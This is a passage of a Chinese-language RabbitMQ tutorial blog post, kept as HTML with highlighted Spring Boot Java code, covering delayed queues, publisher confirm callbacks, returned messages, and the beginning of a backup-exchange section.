class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">recieveDelayQueue</span><span class="hljs-params">(Message message)</span>&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(message.getBody());<br>        log.info(<span class="hljs-string">&quot;当前时间：&#123;&#125;，收到延迟队列的消息：&#123;&#125;&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().toString(),msg);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>生产者</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">* 发送延迟消息</span><br><span class="hljs-comment">* */</span><br><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(&quot;/ttl&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SendMsgController</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> RabbitTemplate rabbitTemplate;<br><br>    <span class="hljs-comment">//开始发消息 基于插件的 消息 及 延迟的时间</span><br>    <span class="hljs-meta">@GetMapping(&quot;/sendDelayMsg/&#123;message&#125;/&#123;delayTime&#125;&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendMsg</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String message,<span class="hljs-meta">@PathVariable</span> Integer delayTime)</span>&#123;<br>        log.info(<span class="hljs-string">&quot;当前时间：&#123;&#125;，发送一条时长&#123;&#125;毫秒信息给延迟队列delayed.queue：&#123;&#125;&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().toString(),delayTime,message);<br>        rabbitTemplate.convertAndSend(DelayedQueueConfig.DELAYED_EXCHANGE_NAME<br>                ,DelayedQueueConfig.DELAYED_ROUTING_KEY,message,msg -&gt; &#123;<br>            <span class="hljs-comment">// 发送消息的时候 延迟时长 单位ms</span><br>            msg.getMessageProperties().setDelay(delayTime);<br>            <span class="hljs-keyword">return</span> msg;<br>                &#125;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>效果</p><p>访问：</p><p><a href="http://localhost:8080/ttl/sendDelayMsg/come">http://localhost:8080/ttl/sendDelayMsg/come</a> on baby1/20000</p><p><a href="http://localhost:8080/ttl/sendDelayMsg/come">http://localhost:8080/ttl/sendDelayMsg/come</a> on baby2/2000</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113143811144.png" alt="image-20230113143811144" /></p></li></ol><p>​第二个消息被先消费掉了，符合预期</p><blockquote><p>总结</p></blockquote><ol><li>延时队列在需要延时处理的场景下非常有用，使用RabbitMQ来实现延时队列可以很好的利用<br />RabbitMQ.的特性，如:消息可靠发送、消息可靠投递、死信队列来保障消息至少被消费一次以及未被正确处理的消息不会被丢弃。另外，通过RabbitMQ集群的特性，可以很好的解决单点故障问题，不会因为单个节点挂掉导致延时队列不可用或者消息丢失。</li><li>当然，延时队列还有很多其它选择，比如利用Java的DelayQueue，利用Redis.的zsset，利用Quartz或者利用kafka的时间轮，这些方式各有特点,看需要适用的场景</li></ol><h1 id="9-发布确认高级"><a class="markdownIt-Anchor" href="#9-发布确认高级"></a> 9. 发布确认高级</h1><blockquote><p>介绍</p></blockquote><p>在生产环境中由于一些不明原因，导致 rabbitmq重启，在RabbitMQ重启期间生产者消息投递失败,导致消息丢失，需要手动处理和恢复。于是，我们开始思考，如何才能进行RabbitMQ的消息可靠投递呢?特别是在这样比较极端的情况，RabbitMQ集群不可用的时候，无法投递的消息该如何处理呢：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113144153062.png" alt="image-20230113144153062" /></p><blockquote><p>实现</p></blockquote><ol><li><p>配置文件：添加</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">spring.rabbitmq.publisher-confirm-type</span> = <span class="hljs-string">correlated</span><br></code></pre></td></tr></table></figure></li><li><p>配置类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.config;<br><br><span class="hljs-keyword">import</span> org.springframework.amqp.core.*;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Qualifier;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 配置类：发布确认（高级）</span><br><span class="hljs-comment"> * [io.xtwoy.config]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : [席子不会敲代码]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> : [V1.0]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> : [2023/1/13 14:46]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConfirmConfig</span> &#123;<br><br>    <span class="hljs-comment">//交换机</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CONFIRM_EXCHANGE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;confirm_exchange&quot;</span>;<br>    <span class="hljs-comment">//队列</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CONFIRM_QUEUE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;confirm_queue&quot;</span>;<br>    <span class="hljs-comment">//RoutingKey</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CONFIRM_routing_key</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;key1&quot;</span>;<br><br>    <span class="hljs-comment">//声明交换机</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> DirectExchange <span class="hljs-title function_">confirmExchange</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DirectExchange</span>(CONFIRM_EXCHANGE_NAME);<br>    &#125;<br><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Queue <span class="hljs-title function_">confirmQueue</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> QueueBuilder.durable(CONFIRM_QUEUE_NAME).build();<br>    &#125;<br><br>    <span class="hljs-comment">//绑定</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Binding <span class="hljs-title function_">queueBindingExchange</span><span class="hljs-params">(<span class="hljs-meta">@Qualifier(&quot;confirmQueue&quot;)</span> Queue confirmQueue,</span><br><span class="hljs-params">                                        <span class="hljs-meta">@Qualifier(&quot;confirmExchange&quot;)</span> DirectExchange confirmExchange)</span> &#123;<br>        <span class="hljs-keyword">return</span> BindingBuilder.bind(confirmQueue).to(confirmExchange).with(CONFIRM_routing_key);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>生产者</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 开始发消息 测试确认</span><br><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@RequestMapping(&quot;/confirm&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProducerController</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> RabbitTemplate rabbitTemplate;<br><br>    <span class="hljs-comment">//发消息</span><br>    <span class="hljs-meta">@GetMapping(&quot;/sendMessage/&#123;message&#125;&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendMessage</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String message)</span>&#123;<br>        rabbitTemplate.convertAndSend(ConfirmConfig.CONFIRM_EXCHANGE_NAME<br>                ,ConfirmConfig.CONFIRM_routing_key<br>                ,message);<br>        log.info(<span class="hljs-string">&quot;发送消息内容：&#123;&#125;&quot;</span>,message);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>消费者</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.consumer;<br><br><span class="hljs-keyword">import</span> io.xtwoy.config.ConfirmConfig;<br><span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;<br><span class="hljs-keyword">import</span> org.springframework.amqp.core.Message;<br><span class="hljs-keyword">import</span> org.springframework.amqp.rabbit.annotation.RabbitListener;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Component;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 发布确认 消费者</span><br><span class="hljs-comment"> * [io.xtwoy.consumer]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : [席子不会敲代码]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> : [V1.0]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> : [2023/1/13 14:50]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConfirmConsumer</span> &#123;<br><br>    <span class="hljs-meta">@RabbitListener(queues = ConfirmConfig.CONFIRM_QUEUE_NAME)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">receiveConfirmMessage</span><span class="hljs-params">(Message message)</span>&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(message.getBody());<br>        log.info(<span class="hljs-string">&quot;接受到的队列confirm.queue消息：&#123;&#125;&quot;</span>,msg);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>回调接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Component</span><br><span class="hljs-meta">@Slf4j</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyCallBack</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RabbitTemplate</span>.ConfirmCallback &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> RabbitTemplate rabbitTemplate;<br><br>    <span class="hljs-meta">@PostConstruct</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-comment">//注入</span><br>        rabbitTemplate.setConfirmCallback(<span class="hljs-built_in">this</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    * 交换机确认回调方法,发消息后，交换机接收到了就回调</span><br><span class="hljs-comment">    *   1.1 correlationData：保存回调消息的ID及相关信息</span><br><span class="hljs-comment">    *   1.2 b:交换机收到消息，为true</span><br><span class="hljs-comment">    *   1.3 s:失败原因，成功为null</span><br><span class="hljs-comment">    *</span><br><span class="hljs-comment">    * 发消息，交换机接受失败，也回调</span><br><span class="hljs-comment">    *   2.1 correlationData：保存回调消息的ID及相关信息</span><br><span class="hljs-comment">    *   2.2 b:交换机没收到消息，为false</span><br><span class="hljs-comment">    *   2.3 s:失败的原因</span><br><span class="hljs-comment">    *</span><br><span class="hljs-comment">     * */</span><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">confirm</span><span class="hljs-params">(CorrelationData correlationData, <span class="hljs-type">boolean</span> b, String s)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> correlationData!=<span class="hljs-literal">null</span> ? correlationData.getId():<span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span> (b)&#123;<br>            log.info(<span class="hljs-string">&quot;交换机已经收到ID为：&#123;&#125;的信息&quot;</span>,id);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            log.info(<span class="hljs-string">&quot;交换机还未收到ID为：&#123;&#125;的消息，由于原因：&#123;&#125;&quot;</span>,id,s);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>配置文件及消息发送方</p><table><thead><tr><th>值</th><th>作用</th></tr></thead><tbody><tr><td>NONE</td><td>禁用发布确认模式，是默认值</td></tr><tr><td>CORRELATED</td><td>发布消息成功到交换器后会触发回调方法</td></tr><tr><td>SIMPLE</td><td>经测试有两种效果，其一效果和 CORRELATED 值一样会触发回调方法，其二在发布消息成功后使用 rabbitTemplate 调用 waitForConfirms 或 waitForConfirmsOrDie 方法</td></tr></tbody></table><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">spring.rabbitmq.publisher-confirm-type</span> = <span class="hljs-string">correlated</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@RequestMapping(&quot;/confirm&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProducerController</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> RabbitTemplate rabbitTemplate;<br><br>    <span class="hljs-comment">//发消息</span><br>    <span class="hljs-meta">@GetMapping(&quot;/sendMessage/&#123;message&#125;&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendMessage</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String message)</span> &#123;<br><br>        rabbitTemplate.convertAndSend(ConfirmConfig.CONFIRM_EXCHANGE_NAME<br>                , ConfirmConfig.CONFIRM_routing_key<br>                , message<br>                , <span class="hljs-keyword">new</span> <span class="hljs-title class_">CorrelationData</span>(UUID.randomUUID().toString()));<br><br>        rabbitTemplate.convertAndSend(ConfirmConfig.CONFIRM_EXCHANGE_NAME<br>                , ConfirmConfig.CONFIRM_routing_key1<br>                , message<br>                , <span class="hljs-keyword">new</span> <span class="hljs-title class_">CorrelationData</span>(UUID.randomUUID().toString()));<br><br>        log.info(<span class="hljs-string">&quot;发送消息内容：&#123;&#125;&quot;</span>, message);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p><strong>结果分析</strong></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113151159399.png" alt="image-20230113151159399" /></p><p>可以看到，发送了两条消息，第一条消息的 RoutingKey 为 “key1”，第二条消息的 RoutingKey 为&quot;key2&quot;，两条消息都成功被交换机接收，也收到了交换机的确认回调，但消费者只收到了一条消息，因为第二条消息的 RoutingKey 与队列的 BindingKey 不一致，也没有其它队列能接收这个消息，所有第二条消息被直接丢弃了。</p></li></ol><p>​</p><h2 id="91-回退消息"><a class="markdownIt-Anchor" href="#91-回退消息"></a> 9.1 回退消息</h2><p><strong>Mandatory 参数</strong></p><p><strong>在仅开启了生产者确认机制的情况下，交换机接收到消息后，会直接给消息生产者发送确认消息，如果发现该消息不可路由，那么消息会被直接丢弃，此时生产者是不知道消息被丢弃这个事件的</strong>。那么如何让无法被路由的消息帮我想办法处理一下？最起码通知我一声，我好自己处理啊。通过设置 <code>mandatory</code> 参数可以在当消息传递过程中不可达目的地时将消息返回给生产者。</p><ol><li><p>配置文件</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">spring.rabbitmq.publisher-returns</span>=<span class="hljs-string">true</span><br></code></pre></td></tr></table></figure></li><li><p>回退接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.config.callback;<br><br><span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;<br><span class="hljs-keyword">import</span> org.springframework.amqp.core.Message;<br><span class="hljs-keyword">import</span> org.springframework.amqp.rabbit.connection.CorrelationData;<br><span class="hljs-keyword">import</span> org.springframework.amqp.rabbit.core.RabbitTemplate;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Component;<br><br><span class="hljs-keyword">import</span> javax.annotation.PostConstruct;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 消息回调</span><br><span class="hljs-comment"> * [io.xtwoy.config.callback]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : [席子不会敲代码]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> : [V1.0]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> : [2023/1/13 14:53]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Component</span><br><span class="hljs-meta">@Slf4j</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyCallBack</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RabbitTemplate</span>.ConfirmCallback,RabbitTemplate.ReturnCallback &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> RabbitTemplate rabbitTemplate;<br><br>    <span class="hljs-meta">@PostConstruct</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-comment">//注入</span><br>        rabbitTemplate.setConfirmCallback(<span class="hljs-built_in">this</span>);<br>        rabbitTemplate.setReturnCallback(<span class="hljs-built_in">this</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 交换机确认回调方法,发消息后，交换机接收到了就回调</span><br><span class="hljs-comment">     *   1.1 correlationData：保存回调消息的ID及相关信息</span><br><span class="hljs-comment">     *   1.2 b:交换机收到消息，为true</span><br><span class="hljs-comment">     *   1.3 s:失败原因，成功为null</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * 发消息，交换机接受失败，也回调</span><br><span class="hljs-comment">     *   2.1 correlationData：保存回调消息的ID及相关信息</span><br><span class="hljs-comment">     *   2.2 b:交换机没收到消息，为false</span><br><span class="hljs-comment">     *   2.3 s:失败的原因</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * */</span><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">confirm</span><span class="hljs-params">(CorrelationData correlationData, <span class="hljs-type">boolean</span> b, String s)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> correlationData!=<span class="hljs-literal">null</span> ? correlationData.getId():<span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span> (b)&#123;<br>            log.info(<span class="hljs-string">&quot;交换机已经收到ID为：&#123;&#125;的信息&quot;</span>,id);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            log.info(<span class="hljs-string">&quot;交换机还未收到ID为：&#123;&#125;的消息，由于原因：&#123;&#125;&quot;</span>,id,s);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">//可以在当消息传递过程中不可达目的的时将消息返回给生产者</span><br>    <span class="hljs-comment">//只有不可达目的地的时候才可回退</span><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">returnedMessage</span><span class="hljs-params">(Message message, <span class="hljs-type">int</span> replyCode, String replyText, String exchange, String routingKey)</span> &#123;<br>        log.error(<span class="hljs-string">&quot;消息&#123;&#125;，被交换机&#123;&#125;退回，退回的原因：&#123;&#125;,路由Key：&#123;&#125;,replyCode：&#123;&#125;&quot;</span><br>                ,<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(message.getBody()),<br>                exchange,<br>                replyText,<br>                routingKey,<br>                replyCode<br>                );<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>发布测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 开始发消息 测试确认</span><br><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@RequestMapping(&quot;/confirm&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProducerController</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> RabbitTemplate rabbitTemplate;<br><br>    <span class="hljs-comment">//发消息</span><br>    <span class="hljs-meta">@GetMapping(&quot;/sendMessage/&#123;message&#125;&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendMessage</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String message)</span>&#123;<br>        <span class="hljs-type">CorrelationData</span> <span class="hljs-variable">correlationData</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CorrelationData</span>(<span class="hljs-string">&quot;1&quot;</span>);<br>        rabbitTemplate.convertAndSend(ConfirmConfig.CONFIRM_EXCHANGE_NAME<br>                ,ConfirmConfig.CONFIRM_routing_key<br>                ,message+<span class="hljs-string">&quot;key1&quot;</span>,correlationData);<br>        log.info(<span class="hljs-string">&quot;发送消息内容：&#123;&#125;&quot;</span>,message+<span class="hljs-string">&quot;key1&quot;</span>);<br><br>        <span class="hljs-type">CorrelationData</span> <span class="hljs-variable">correlationData2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CorrelationData</span>(<span class="hljs-string">&quot;2&quot;</span>);<br>        rabbitTemplate.convertAndSend(ConfirmConfig.CONFIRM_EXCHANGE_NAME<br>                ,ConfirmConfig.CONFIRM_routing_key+<span class="hljs-string">&quot;2&quot;</span><br>                ,message+<span class="hljs-string">&quot;key12&quot;</span>,correlationData2);<br>        log.info(<span class="hljs-string">&quot;发送消息内容：&#123;&#125;&quot;</span>,message+<span class="hljs-string">&quot;key12&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>效果：实现回退消息成功！</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113152945118.png" alt="image-20230113152945118" /></p></li></ol><h2 id="92-备份交换机"><a class="markdownIt-Anchor" href="#92-备份交换机"></a> 9.2 备份交换机</h2><p>​有了mandatory 